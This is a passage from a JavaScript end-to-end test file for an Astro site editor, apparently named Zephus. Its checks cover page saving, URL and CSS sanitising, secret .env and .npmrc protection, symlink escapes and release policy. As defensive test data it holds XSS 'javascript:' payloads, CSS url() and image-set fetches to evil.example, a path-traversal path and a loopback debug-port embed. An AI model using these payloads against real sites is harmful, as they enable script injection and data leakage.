      rm(tmp);
    } catch (e) {
      record("malformed sections sidecar preserved", false, e.message);
    }
  }

  // 3. Nested index save keeps file path, route, and refuses dual blog files.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record("nested index save keeps file and route", false, e.message);
      ctx = null;
    }
    if (ctx) {
      const { tmp, project, pagesDir } = ctx;
      try {
        const created = svc.schema.createSchemaPage(
          project,
          pagesRel,
          "blog/index",
        );
        const indexPath = path.join(pagesDir, "blog", "index.astro");
        const flatPath = path.join(pagesDir, "blog.astro");
        let routeOk = false;
        if (created.ok && created.pageDocument) {
          routeOk = created.pageDocument.route === "/blog";
        }
        const pathOk = fs.existsSync(indexPath) && !fs.existsSync(flatPath);
        record(
          "nested index save keeps file and route",
          created.ok && pathOk && routeOk,
          `created=${created.ok} index=${fs.existsSync(indexPath)} flat=${fs.existsSync(flatPath)} route=${created.pageDocument?.route}`,
        );

        fs.mkdirSync(path.dirname(indexPath), { recursive: true });
        fs.writeFileSync(
          flatPath,
          "---\nimport BaseLayout from '../../layouts/BaseLayout.astro';\n---\n<p>flat</p>\n",
          "utf8",
        );
        fs.writeFileSync(
          indexPath,
          "---\nimport BaseLayout from '../../layouts/BaseLayout.astro';\n---\n<p>index</p>\n",
          "utf8",
        );
        const flatBefore = fs.readFileSync(flatPath, "utf8");
        const indexBefore = fs.readFileSync(indexPath, "utf8");
        let dualThrew = false;
        let dualOk = false;
        const indexRel = path
          .join(pagesRel, "blog", "index.astro")
          .replace(/\\/g, "/");
        const indexDoc = svc.schema.readPageDocument(
          project,
          indexRel,
          pagesRel,
        );
        if (indexDoc.ok && indexDoc.pageDocument) {
          try {
            const res = svc.schema.writePageDocument(
              project,
              pagesRel,
              indexDoc.pageDocument,
            );
            dualOk = !!res.ok;
          } catch {
            dualThrew = true;
          }
        }
        const unchanged =
          fs.readFileSync(flatPath, "utf8") === flatBefore &&
          fs.readFileSync(indexPath, "utf8") === indexBefore;
        record(
          "nested index dual file save refused",
          (dualThrew || !dualOk) && unchanged,
          `dualOk=${dualOk} threw=${dualThrew} unchanged=${unchanged}`,
        );
      } finally {
        rm(tmp);
      }
    }
  }

  // 4. Hide on desktop uses min-width media query, not inline display:none.
  {
    const sections = [
      {
        id: "sec-hide-desktop",
        type: "section",
        label: "Hide desktop",
        props: { wrapper: "none", cls: "" },
        children: [
          {
            id: "block-desktop-hide",
            type: "text",
            props: { text: "Hide me on desktop" },
            style: { hideOn: ["desktop"] },
          },
        ],
      },
    ];
    const css = blockRender.collectResponsiveCss(sections);
    const markup = blockRender.renderSectionsMarkup(sections, (block) =>
      blockRender.renderBlockHtml(block),
    );
    const desktopMedia =
      /@media[^{]*min-width:\s*1025px[\s\S]*display\s*:\s*none/i.test(css);
    const inlineHide = /style="[^"]*display\s*:\s*none/i.test(markup);
    record(
      "hideOn desktop min-width query",
      desktopMedia && !inlineHide,
      `desktopMedia=${desktopMedia} inlineHide=${inlineHide}`,
    );
  }

  // 5. safeUrl rejects leading C0 control before javascript: scheme.
  {
    const rh = await import(
      pathToFileURL(path.join(ROOT, "dist", "shared", "renderHelpers.js")).href
    );
    const payload = `\u0001javascript:alert(1)`;
    record(
      "safeUrl rejects C0 javascript scheme",
      rh.safeUrl(payload) === "",
      `got=${JSON.stringify(rh.safeUrl(payload))}`,
    );
    const google = "https://fonts.googleapis.com/css2?family=Inter";
    record(
      "google font stylesheet url rejects other hosts",
      rh.googleFontStylesheetUrl("https://evil.example/steal.css") === "" &&
        rh.googleFontStylesheetUrl(`  ${google}  `) === google,
      `evil=${JSON.stringify(rh.googleFontStylesheetUrl("https://evil.example/steal.css"))}`,
    );
    const imageSet = rh.designCssValue(
      'image-set("https://evil.example/set.png" 1x)',
    );
    const webkitSet = rh.designCssValue(
      '-webkit-image-set("https://evil.example/set.png" 1x)',
    );
    const escapedUrl = rh.designCssValue(
      "\\75 rl(https://evil.example/escape.png)",
    );
    const nestedEscape = rh.designCssValue(
      "\\5c 75 rl(https://evil.example/nested.png)",
    );
    record(
      "design css value drops url fetch",
      !rh
        .designCssValue("url(https://evil.example/pixel)")
        .toLowerCase()
        .includes("url(") &&
        !rh
          .designCssValue("url(https://evil.example/pixel)")
          .includes("evil.example") &&
        !imageSet.toLowerCase().includes("image-set") &&
        !imageSet.includes("evil.example") &&
        !webkitSet.toLowerCase().includes("image-set") &&
        !webkitSet.includes("evil.example") &&
        !escapedUrl.toLowerCase().includes("url(") &&
        !escapedUrl.includes("evil.example") &&
        !nestedEscape.toLowerCase().includes("url(") &&
        !nestedEscape.includes("evil.example") &&
        rh.designCssValue("rgb(10 20 30 / 0.5)") === "rgb(10 20 30 / 0.5)" &&
        rh.designCssValue("var(--accent)") === "var(--accent)" &&
        rh.designCssValue("calc(100% - 1rem)") === "calc(100% - 1rem)",
      `got=${JSON.stringify(rh.designCssValue("url(https://evil.example/pixel)"))} set=${JSON.stringify(imageSet)} escaped=${JSON.stringify(escapedUrl)} nested=${JSON.stringify(nestedEscape)}`,
    );
    const remoteBackground = {
      type: "section",
      props: {},
      style: {
        background: "url(https://evil.example/pixel)",
        color: "#123456",
      },
    };
    const canvasStyle = rh.styleAttr(remoteBackground, { forCanvas: true });
    const builtStyle = rh.styleAttr(remoteBackground);
    record(
      "canvas style drops remote background fetch",
      !canvasStyle.toLowerCase().includes("url(") &&
        !canvasStyle.includes("evil.example") &&
        canvasStyle.includes("#123456") &&
        builtStyle.toLowerCase().includes("url(") &&
        builtStyle.includes("evil.example"),
      `canvas=${canvasStyle} built=${builtStyle}`,
    );
    const loopbackEmbed = {
      id: "e2e-embed",
      type: "embed",
      props: { src: "http://127.0.0.1:9222/", title: "Local" },
    };
    const publicEmbed = {
      id: "e2e-embed-public",
      type: "embed",
      props: {
        src: "https://www.youtube.com/embed/abc",
        title: "Public",
      },
    };
    const canvasLoopback = blockRender.renderBlockHtml(loopbackEmbed, {
      forCanvas: true,
    });
    const builtLoopback = blockRender.renderBlockHtml(loopbackEmbed);
    const canvasPublic = blockRender.renderBlockHtml(publicEmbed, {
      forCanvas: true,
    });
    const builtPublic = blockRender.renderBlockHtml(publicEmbed);
    const canvasVideo = blockRender.renderBlockHtml(
      {
        id: "e2e-video",
        type: "video",
        props: { src: "https://example.com/clip.mp4", title: "Clip" },
      },
      { forCanvas: true },
    );
    const builtVideo = blockRender.renderBlockHtml({
      id: "e2e-video",
      type: "video",
      props: { src: "https://example.com/clip.mp4", title: "Clip" },
    });
    record(
      "canvas embed and video stay in the site preview",
      !/<iframe\b/i.test(canvasLoopback) &&
        !/<iframe\b/i.test(canvasPublic) &&
        !/<video\b/i.test(canvasVideo) &&
        !/src=["']http:\/\/127\.0\.0\.1/i.test(canvasLoopback) &&
        !/src=["']https:\/\/www\.youtube\.com/i.test(canvasPublic) &&
        !/src=["']https:\/\/example\.com/i.test(canvasVideo) &&
        canvasLoopback.includes("Embed loads in the site preview.") &&
        canvasPublic.includes("Embed loads in the site preview.") &&
        canvasVideo.includes("Video plays in the site preview.") &&
        builtLoopback.includes('src="http://127.0.0.1:9222/"') &&
        builtPublic.includes('src="https://www.youtube.com/embed/abc"') &&
        builtVideo.includes('src="https://example.com/clip.mp4"'),
      `canvas=${canvasLoopback} public=${canvasPublic} video=${canvasVideo}`,
    );
    const remoteImage = {
      id: "e2e-image-remote",
      type: "image",
      props: { src: "https://example.com/photo.jpg", alt: "Photo", cls: "" },
    };
    const projectImage = {
      id: "e2e-image-project",
      type: "image",
      props: { src: "/assets/images/photo.jpg", alt: "Photo", cls: "" },
    };
    const canvasRemoteImage = blockRender.renderBlockHtml(remoteImage, {
      forCanvas: true,
    });
    const builtRemoteImage = blockRender.renderBlockHtml(remoteImage);
    const canvasProjectImage = blockRender.renderBlockHtml(projectImage, {
      forCanvas: true,
    });
    const canvasGallery = blockRender.renderBlockHtml(
      {
        id: "e2e-gallery-remote",
        type: "gallery",
        props: {
          images: "https://example.com/a.jpg\n/assets/images/b.jpg",
          cls: "",
        },
      },
      { forCanvas: true },
    );
    const canvasPostImage = blockRender.renderBlockHtml(
      {
        id: "e2e-post-image",
        type: "postlist",
        props: { showImage: "true", folder: "/blog", cls: "" },
      },
      {
        forCanvas: true,
        posts: [
          {
            route: "/blog/p",
            title: "P",
            description: "",
            date: "2026-01-01",
            author: "",
            image: "https://cdn.example/cover.jpg",
          },
        ],
      },
    );
    record(
      "canvas remote images stay in the site preview",
      !/<img\b/i.test(canvasRemoteImage) &&
        canvasRemoteImage.includes("Image loads in the site preview.") &&
        !/src=["']https:\/\/example\.com/i.test(canvasRemoteImage) &&
        builtRemoteImage.includes('src="https://example.com/photo.jpg"') &&
        canvasProjectImage.includes(
          `src="${blockRender.CANVAS_ASSET_PLACEHOLDER_SRC}"`,
        ) &&
        canvasProjectImage.includes(
          'data-asset-src="/assets/images/photo.jpg"',
        ) &&
        canvasGallery.includes("Image loads in the site preview.") &&
        canvasGallery.includes('data-asset-src="/assets/images/b.jpg"') &&
        !/src=["']https:\/\/example\.com/i.test(canvasGallery) &&
        !/<img\b/i.test(canvasPostImage) &&
        canvasPostImage.includes("Image loads in the site preview."),
      `image=${canvasRemoteImage} gallery=${canvasGallery} post=${canvasPostImage}`,
    );
    const protocolImage = blockRender.renderBlockHtml(
      {
        id: "e2e-image-protocol",
        type: "image",
        props: { src: "//cdn.example/photo.jpg", alt: "Photo", cls: "" },
      },
      { forCanvas: true },
    );
    const builtProtocolImage = blockRender.renderBlockHtml({
      id: "e2e-image-protocol",
      type: "image",
      props: { src: "//cdn.example/photo.jpg", alt: "Photo", cls: "" },
    });
    const queryImage = blockRender.renderBlockHtml(
      {
        id: "e2e-image-query",
        type: "image",
        props: { src: "/assets/images/photo.jpg?x=1", alt: "Photo", cls: "" },
      },
      { forCanvas: true },
    );
    const parentGallery = blockRender.renderBlockHtml(
      {
        id: "e2e-gallery-parent",
        type: "gallery",
        props: { images: "/assets/../secret.jpg", cls: "" },
      },
      { forCanvas: true },
    );
    const protocolPost = blockRender.renderBlockHtml(
      {
        id: "e2e-post-protocol",
        type: "postlist",
        props: { showImage: "true", folder: "/blog", cls: "" },
      },
      {
        forCanvas: true,
        posts: [
          {
            route: "/blog/p",
            title: "P",
            description: "",
            date: "2026-01-01",
            author: "",
            image: "//cdn.example/cover.jpg",
          },
        ],
      },
    );
    record(
      "canvas image paths that are not project files stay in the site preview",
      !/<img\b/i.test(protocolImage) &&
        protocolImage.includes("Image loads in the site preview.") &&
        !protocolImage.includes("data-asset-src") &&
        builtProtocolImage.includes('src="//cdn.example/photo.jpg"') &&
        !/<img\b/i.test(queryImage) &&
        queryImage.includes("Image loads in the site preview.") &&
        !queryImage.includes("data-asset-src") &&
        !/<img\b/i.test(parentGallery) &&
        parentGallery.includes("Image loads in the site preview.") &&
        !parentGallery.includes("data-asset-src") &&
        !/<img\b/i.test(protocolPost) &&
        protocolPost.includes("Image loads in the site preview.") &&
        !protocolPost.includes("data-asset-src"),
      `protocol=${protocolImage} query=${queryImage} parent=${parentGallery} post=${protocolPost}`,
    );
  }

  // 6. Custom frontmatter survives post-list refresh when another page saves.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record("custom frontmatter survives post list refresh", false, e.message);
      ctx = null;
    }
    if (ctx) {
      const { tmp, project, pagesDir } = ctx;
      try {
        const indexRel = path.join(pagesRel, "index.astro").replace(/\\/g, "/");
        const indexDoc = svc.schema.readPageDocument(
          project,
          indexRel,
          pagesRel,
        );
        const marker = "customE2eProbe: keep-me";
        if (indexDoc.ok && indexDoc.pageDocument) {
          const sec = indexDoc.pageDocument.sections[0];
          if (sec) {
            sec.children.push({
              id: "e2e-postlist",
              type: "postlist",
              props: { limit: "5", cls: "" },
              style: {},
            });
          }
          svc.schema.writePageDocument(
            project,
            pagesRel,
            indexDoc.pageDocument,
          );
        }
        const indexPath = path.join(pagesDir, "index.astro");
        let raw = fs.readFileSync(indexPath, "utf8");
        if (!raw.includes(marker)) {
          raw = raw.replace(/^---\n/m, `---\n${marker}\n`);
          fs.writeFileSync(indexPath, raw, "utf8");
        }
        const resync = svc.schema.readPageDocument(project, indexRel, pagesRel);
        if (resync.ok && resync.pageDocument) {
          svc.schema.writePageDocument(project, pagesRel, resync.pageDocument);
        }
        const other = svc.schema.createSchemaPage(
          project,
          pagesRel,
          "e2e-other",
        );
        if (!other.ok) {
          record(
            "custom frontmatter survives post list refresh",
            false,
            other.error ?? "other page",
          );
        } else {
          const after = fs.readFileSync(indexPath, "utf8");
          record(
            "custom frontmatter survives post list refresh",
            after.includes(marker),
            after.includes(marker) ? "ok" : "marker missing after other save",
          );
        }
      } finally {
        rm(tmp);
      }
    }
  }

  // 7. Secret .env paths must not return file bytes from read or reattach.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record("secret env page read returns null source", false, e.message);
      record("secret env reattach returns null source", false, e.message);
      ctx = null;
    }
    if (ctx) {
      const { tmp, project } = ctx;
      const secretBody = "SECRET_E2E_ZEPHUS=1";
      const envPath = path.join(project, ".env");
      try {
        fs.writeFileSync(envPath, `${secretBody}\n`, "utf8");
        const readRes = svc.schema.readPageDocument(project, ".env", pagesRel);
        const readPass =
          readRes.source === null &&
          !JSON.stringify(readRes).includes(secretBody);
        record(
          "secret env page read returns null source",
          readPass,
          readRes.source ? "source returned" : `ok=${readRes.ok}`,
        );
        const reattachRes = svc.schema.reattachPageDocument(
          project,
          ".env",
          pagesRel,
        );
        const reattachPass =
          reattachRes.source === null &&
          !JSON.stringify(reattachRes).includes(secretBody);
        record(
          "secret env reattach returns null source",
          reattachPass,
          reattachRes.source ? "source returned" : `ok=${reattachRes.ok}`,
        );
      } finally {
        fs.rmSync(envPath, { force: true });
        rm(tmp);
      }
    }
  }

  // 8. Managed layoutPath must not overwrite package.json.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record(
        "managed layoutPath cannot clobber package.json",
        false,
        e.message,
      );
      ctx = null;
    }
    if (ctx) {
      const { tmp, project } = ctx;
      const pkgPath = path.join(project, "package.json");
      try {
        const before = fs.readFileSync(pkgPath, "utf8");
        const siteRead = svc.schema.readSiteDocument(project);
        if (!siteRead.ok || !siteRead.site) {
          record(
            "managed layoutPath cannot clobber package.json",
            false,
            "no site",
          );
        } else {
          siteRead.site.shell.layoutPath = "package.json";
          siteRead.site.shell.layoutMode = "managed";
          svc.schema.writeSiteDocument(project, siteRead.site, pagesRel);
          const after = fs.readFileSync(pkgPath, "utf8");
          record(
            "managed layoutPath cannot clobber package.json",
            after === before,
            after === before ? "ok" : "package.json changed",
          );
        }
      } finally {
        rm(tmp);
      }
    }
  }

  // 9. Git must refuse directory adds with nested secrets and broad pathspecs.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record("git commit all refuses directory npmrc", false, e.message);
      record("commitProjectPaths refuses broad pathspecs", false, e.message);
      ctx = null;
    }
    if (ctx) {
      const { tmp, project } = ctx;
      try {
        if (!fs.existsSync(path.join(project, ".git"))) {
          execFileSync("git", ["init"], { cwd: project, stdio: "ignore" });
        }
        execFileSync("git", ["config", "user.name", "E2E"], {
          cwd: project,
          stdio: "ignore",
        });
        execFileSync("git", ["config", "user.email", "e2e@zephus.local"], {
          cwd: project,
          stdio: "ignore",
        });
        const secretDir = path.join(project, "nested-secret-dir");
        fs.mkdirSync(secretDir, { recursive: true });
        fs.writeFileSync(path.join(secretDir, ".npmrc"), "token=1\n", "utf8");
        const gitMod = await import(
          pathToFileURL(path.join(ROOT, "dist", "main", "services", "git.js"))
            .href
        );
        const commitAll = await gitMod.commitAllChanges(
          project,
          "e2e secret dir",
        );
        record(
          "git commit all refuses directory npmrc",
          !commitAll.ok,
          commitAll.ok ? "commit succeeded" : (commitAll.error ?? "refused"),
        );
        fs.writeFileSync(path.join(project, "track-me.txt"), "x\n", "utf8");
        const dotCommit = await gitMod.commitProjectPaths(project, "e2e dot", [
          ".",
        ]);
        const starCommit = await gitMod.commitProjectPaths(
          project,
          "e2e star",
          ["*"],
        );
        record(
          "commitProjectPaths refuses broad pathspecs",
          !dotCommit.ok && !starCommit.ok,
          `dot=${dotCommit.ok ? "ok" : dotCommit.error} star=${starCommit.ok ? "ok" : starCommit.error}`,
        );
      } finally {
        rm(tmp);
      }
    }
  }

  // 10. Custom Node path must not prepend its directory to PATH.
  {
    const nodeCheck = await import(
      pathToFileURL(path.join(ROOT, "dist", "main", "services", "nodeCheck.js"))
        .href
    );
    const env = await nodeCheck.buildSpawnEnv(process.execPath, {
      PATH: "/usr/bin:/bin",
    });
    const key =
      process.platform === "win32"
        ? (Object.keys(env).find((k) => k.toUpperCase() === "PATH") ?? "PATH")
        : "PATH";
    const parts = String(env[key] ?? "")
      .split(process.platform === "win32" ? ";" : ":")
      .filter(Boolean);
    const nodeDir = path.dirname(process.execPath);
    const pass = parts.length === 0 || parts[0] !== nodeDir;
    record(
      "buildSpawnEnv omits custom node dir from PATH front",
      pass,
      `first=${parts[0] ?? ""} nodeDir=${nodeDir}`,
    );
  }

  // 11. Asset usage scan must fail when a page file has no sidecar.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record("findAssetUsage fails without page sidecar", false, e.message);
      ctx = null;
    }
    if (ctx) {
      const { tmp, project, pagesDir } = ctx;
      try {
        const orphan = path.join(pagesDir, "orphan-no-sidecar.astro");
        fs.writeFileSync(
          orphan,
          "---\nimport BaseLayout from '../../layouts/BaseLayout.astro';\n---\n<p>orphan</p>\n",
          "utf8",
        );
        const assetUsage = await import(
          pathToFileURL(
            path.join(ROOT, "dist", "main", "services", "assetUsage.js"),
          ).href
        );
        const usage = assetUsage.findAssetUsage(
          project,
          pagesRel,
          "/images/none.png",
        );
        record(
          "findAssetUsage fails without page sidecar",
          usage.ok === false,
          usage.ok ? "ok=true with orphan page" : (usage.error ?? "ok=false"),
        );
      } finally {
        rm(tmp);
      }
    }
  }

  // 12. Stale publish hint must not beat Astro config outDir.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record("publish outDir ignores stale dist hint", false, e.message);
      ctx = null;
    }
    if (ctx) {
      const { tmp, project } = ctx;
      try {
        const cfgPath = path.join(project, "astro.config.mjs");
        let cfg = fs.readFileSync(cfgPath, "utf8");
        if (!/outDir\s*:/.test(cfg)) {
          cfg = cfg.replace(
            /defineConfig\s*\(\s*\{/,
            "defineConfig({\n  outDir: 'build',",
          );
        } else {
          cfg = cfg.replace(/outDir\s*:\s*['"][^'"]+['"]/, "outDir: 'build'");
        }
        fs.writeFileSync(cfgPath, cfg, "utf8");
        fs.mkdirSync(path.join(project, "dist"), { recursive: true });
        fs.writeFileSync(
          path.join(project, "dist", "index.html"),
          "<html></html>",
          "utf8",
        );
        const projectPaths = await import(
          pathToFileURL(
            path.join(ROOT, "dist", "main", "services", "projectPaths.js"),
          ).href
        );
        const resolved = projectPaths.resolveValidatedBuildOutputDir(
          project,
          "dist",
        );
        const pass =
          resolved.ok &&
          resolved.relative === "build" &&
          resolved.absolute.endsWith(`${path.sep}build`);
        record(
          "publish outDir ignores stale dist hint",
          pass,
          resolved.ok
            ? `relative=${resolved.relative}`
            : (resolved.error ?? "failed"),
        );
      } finally {
        rm(tmp);
      }
    }
  }

  // 13. Prerelease upload set must not include latest.yml for 1.0.0-beta.1.
  {
    const policy = require("./release-upload-policy.js");
    const version = "1.0.0-beta.1";
    const releaseDir = path.join(os.tmpdir(), "zephus-e2e-release-upload");
    fs.mkdirSync(releaseDir, { recursive: true });
    const entries = ["latest.yml", "Zephus-1.0.0-beta.1.dmg"];
    const uploads = policy.getReleaseUploadFiles(entries, releaseDir, version);
    const isPrerelease = policy.isGithubPrereleaseVersion(version);
    const hasLatest = uploads.some((p) =>
      /^latest\.ya?ml$/i.test(path.basename(p)),
    );
    record(
      "prerelease upload omits latest yml",
      isPrerelease && !hasLatest,
      `isPrerelease=${isPrerelease} hasLatest=${hasLatest}`,
    );
  }
}

async function runWebEngineAndUiAuditChecks(svc, blockRender) {
  const esbuild = require("esbuild");
  const { JSDOM } = require("jsdom");
  const dom = new JSDOM("<!doctype html><html><body></body></html>");
  const compileRendererHelper = (entryRel) => {
    const out = esbuild.buildSync({
      entryPoints: [path.join(ROOT, entryRel)],
      bundle: true,
      write: false,
      format: "cjs",
      platform: "node",
    });
    const mod = { exports: {} };
    const sandbox = {
      module: mod,
      exports: mod.exports,
      require,
      console,
      URL,
      decodeURIComponent,
      encodeURIComponent,
      window: dom.window,
      document: dom.window.document,
      DOMParser: dom.window.DOMParser,
      NodeFilter: dom.window.NodeFilter,
      HTMLElement: dom.window.HTMLElement,
      HTMLButtonElement: dom.window.HTMLButtonElement,
      HTMLTemplateElement: dom.window.HTMLTemplateElement,
      Element: dom.window.Element,
      Node: dom.window.Node,
    };
    vm.runInNewContext(out.outputFiles[0].text, sandbox, { timeout: 5000 });
    return mod.exports;
  };

  let editorBlockRender;
  let editorParse;
  let editorBlocks;
  let editorSerialize;
  try {
    editorBlockRender = compileRendererHelper(
      "src/renderer/editorBlockRender.ts",
    );
    editorParse = compileRendererHelper("src/renderer/editorParse.ts");
    editorBlocks = compileRendererHelper("src/renderer/editorBlocks.ts");
    editorSerialize = compileRendererHelper("src/renderer/editorSerialize.ts");
  } catch (e) {
    record("web engine helpers bundle for e2e", false, e.message);
    return;
  }

  // 1. Post List self-exclusion parity between build renderer and editor renderer.
  {
    const postListBlock = {
      id: "pl-e2e",
      type: "postlist",
      props: { title: "Posts", folder: "/blog", limit: "5", cls: "" },
    };
    const posts = [
      { route: "/blog", title: "Blog Index", date: "2026-01-01" },
      { route: "/blog/hello", title: "Hello World", date: "2026-01-02" },
    ];
    const buildHtml = blockRender.renderBlockHtml(postListBlock, {
      viewport: "desktop",
      forCanvas: false,
      maxHeadingLevel: 6,
      posts,
      excludePostListPageRoute: "/blog",
    });
    const editorSerializeHtml = editorBlockRender.blockToHtmlForEditor(
      postListBlock,
      {
        viewport: "desktop",
        forCanvas: false,
        canvasMaxHeadingLevel: 6,
        posts,
        excludePostListPageRoute: "/blog",
      },
    );
    const editorCanvasHtml = editorBlockRender.blockToHtmlForEditor(
      postListBlock,
      {
        viewport: "desktop",
        forCanvas: true,
        canvasMaxHeadingLevel: 6,
        posts,
        excludePostListPageRoute: "/blog",
      },
    );
    const engineSrc = fs.readFileSync(
      path.join(ROOT, "src", "renderer", "zephusEngine.ts"),
      "utf8",
    );
    const engineForwardsRoute =
      engineSrc.includes("excludePostListPageRoute") &&
      editorSerializeHtml === buildHtml &&
      !editorSerializeHtml.includes('href="/blog"') &&
      !editorCanvasHtml.includes('href="/blog"') &&
      editorCanvasHtml.includes('href="/blog/hello"');
    record(
      "postlist self-exclusion editor parity",
      engineForwardsRoute,
      `serializeMatch=${editorSerializeHtml === buildHtml} canvasHasSelf=${editorCanvasHtml.includes('href="/blog"')}`,
    );
  }

  // 2. Legacy inline text-align parity between main regex parser and renderer DOM parser.
  {
    let uid = 0;
    const parser = editorParse.createEditorPageParser({
      uid: () => `e2e-${++uid}`,
      createFallbackSection: () => ({
        id: `e2e-${++uid}`,
        type: "section",
        label: "Main",
        props: { wrapper: "none", cls: "" },
        children: [],
      }),
      knownBlockTypes: editorBlocks.KNOWN_BLOCK_TYPES,
    });
    const src =
      '---\nimport BaseLayout from "../layouts/BaseLayout.astro";\n---\n<BaseLayout>\n<p style="color:red; text-align: center">Centered copy</p>\n</BaseLayout>\n';
    const mainSections = svc.schema.parseSectionsFromSource(src);
    const { inner } = editorSerialize.splitManagedPageSource(src);
    const editorSections = parser.parseSections(inner);
    const mainAlign = mainSections[0]?.children?.[0]?.style?.align;
    const editorAlign = editorSections[0]?.children?.[0]?.style?.align;
    record(
      "legacy inline style text-align parser parity",
      mainAlign === "center" && editorAlign === "center",
      `mainAlign=${String(mainAlign)} editorAlign=${String(editorAlign)}`,
    );
  }

  // 3. Reusable sections storage containment blocks symlink escapes.
  {
    const reusable = await import(
      pathToFileURL(
        path.join(ROOT, "dist", "main", "services", "reusableSections.js"),
      ).href
    );
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "zephus-e2e-reusable-"));
    try {
      const outsideDir = path.join(tmp, "outside");
      const project = path.join(tmp, "project");
      fs.mkdirSync(outsideDir, { recursive: true });
      fs.mkdirSync(path.join(project, ".zephus"), { recursive: true });
      const outsideFile = path.join(outsideDir, "reusable-sections.json");
      const initialOutside = JSON.stringify([
        {
          id: "ext-1",
          label: "Outside Secret",
          html: "<p>outside</p>",
          updatedAt: "2026-01-01",
        },
      ]);
      fs.writeFileSync(outsideFile, initialOutside, "utf8");
      fs.symlinkSync(outsideDir, path.join(project, ".zephus", "templates"));

      const listed = reusable.listReusableSections(project);
      const saved = reusable.saveReusableSection(project, "Inject", "<p>x</p>");
      const deleted = reusable.deleteReusableSection(project, "ext-1");
      const afterOutside = fs.readFileSync(outsideFile, "utf8");

      const pass =
        listed.ok === false &&
        listed.sections.length === 0 &&
        saved.ok === false &&
        deleted.ok === false &&
        afterOutside === initialOutside;
      record(
        "reusable sections symlink escape blocked",
        pass,
        `listOk=${listed.ok} saveOk=${saved.ok} delOk=${deleted.ok} intact=${afterOutside === initialOutside}`,
      );
    } catch (e) {
      record("reusable sections symlink escape blocked", false, e.message);
    } finally {
      rm(tmp);
    }
  }

  // 4. Asset repoint preserves structural metadata and updates reusable sections.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record(
        "asset repoint structural safety & reusable sections",
        false,
        e.message,
      );
      ctx = null;
    }
    if (ctx) {
      const { tmp, project } = ctx;
      try {
        const assetUsage = await import(
          pathToFileURL(
            path.join(ROOT, "dist", "main", "services", "assetUsage.js"),
          ).href
        );
        const reusable = await import(
          pathToFileURL(
            path.join(ROOT, "dist", "main", "services", "reusableSections.js"),
          ).href
        );
        const rel = "index.astro";
        const readDoc = svc.schema.readPageDocument(project, rel, "src/pages");
        const oldAsset = "/assets/images/logo.png";
        const newAsset = "/assets/images/brand.svg";
        svc.schema.writePageDocument(project, "src/pages", {
          ...readDoc.pageDocument,
          sections: [
            {
              id: "sec-assets-band",
              type: "section",
              label: `${oldAsset} Band`,
              props: { wrapper: "none", cls: oldAsset },
              children: [
                {
                  id: "h-e2e",
                  type: "heading",
                  props: { text: `See ${oldAsset}`, level: "2", cls: oldAsset },
                },
                {
                  id: "img-e2e",
                  type: "image",
                  props: { src: oldAsset, alt: "Brand", cls: oldAsset },
                },
              ],
            },
          ],
        });
        reusable.saveReusableSection(
          project,
          "Footer Brand",
          `<img src="${oldAsset}" alt="Brand" />`,
        );

        const usage = assetUsage.findAssetUsage(project, "src/pages", oldAsset);
        const repoint = assetUsage.repointAssetReferences(
          project,
          "src/pages",
          oldAsset,
          newAsset,
        );
        const afterDoc = svc.schema.readPageDocument(project, rel, "src/pages");
        const afterSec = afterDoc.pageDocument?.sections?.[0];
        const afterH = afterSec?.children?.[0];
        const afterImg = afterSec?.children?.[1];
        const afterReusable = reusable.listReusableSections(project);

        const hasReusableRef =
          Array.isArray(usage.siteReferences) &&
          usage.siteReferences.some((s) => s.includes("Footer Brand"));
        const structuralIntact =
          afterSec?.label === `${oldAsset} Band` &&
          afterSec?.props?.cls === oldAsset &&
          afterH?.props?.cls === oldAsset &&
          afterImg?.props?.cls === oldAsset;
        const contentUpdated =
          afterImg?.props?.src === newAsset &&
          afterH?.props?.text === `See ${newAsset}` &&
          afterReusable.sections?.[0]?.html?.includes(newAsset);

        record(
          "asset repoint structural safety & reusable sections",
          !!repoint.ok &&
            hasReusableRef &&
            structuralIntact &&
            !!contentUpdated,
          `hasReusableRef=${hasReusableRef} structuralIntact=${structuralIntact} contentUpdated=${contentUpdated}`,
        );
      } catch (e) {
        record(
          "asset repoint structural safety & reusable sections",
          false,
          e.message,
        );
      } finally {
        rm(tmp);
      }
    }
  }

  // 5. Un-annotated <video> elements migrate cleanly to video blocks across both parsers.
  {
    let uid = 0;
    const parser = editorParse.createEditorPageParser({
      uid: () => `e2e-v-${++uid}`,
      createFallbackSection: () => ({
        id: `e2e-v-${++uid}`,
        type: "section",
        label: "Main",
        props: { wrapper: "none", cls: "" },
        children: [],
      }),
      knownBlockTypes: editorBlocks.KNOWN_BLOCK_TYPES,
    });
    const xssUrl = "java" + "script:alert(1)";
    const src =
      '---\nimport BaseLayout from "../layouts/BaseLayout.astro";\n---\n<BaseLayout>\n' +
      '<video controls src="/assets/clip.mp4" title="Demo"></video>\n' +
      '<video controls style="width: 100%; border-radius: 8px" title="SourceDemo"><source src="/assets/alt.webm" type="video/webm" /></video>\n' +
      `<video src="${xssUrl}"></video>\n` +
      "</BaseLayout>\n";
    const mainBlocks =
      svc.schema.parseSectionsFromSource(src)[0]?.children ?? [];
    const { inner } = editorSerialize.splitManagedPageSource(src);
    const editorBlocksParsed = parser.parseSections(inner)[0]?.children ?? [];

    const checkList = (blocks) =>
      blocks.length === 3 &&
      blocks[0].type === "video" &&
      blocks[0].props?.src === "/assets/clip.mp4" &&
      blocks[0].props?.title === "Demo" &&
      blocks[1].type === "video" &&
      blocks[1].props?.src === "/assets/alt.webm" &&
      blocks[1].props?.title === "SourceDemo" &&
      blocks[1].style?.radius === "8px" &&
      blocks[2].type === "html";

    const okMain = checkList(mainBlocks);
    const okEditor = checkList(editorBlocksParsed);
    record(
      "unannotated video migration parity",
      okMain && okEditor,
      `main=${okMain} editor=${okEditor}`,
    );
  }

  // 6. Managed stylesheet includes complete runtime styles for all supported blocks & shadows.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record("managed stylesheet covers all block classes", false, e.message);
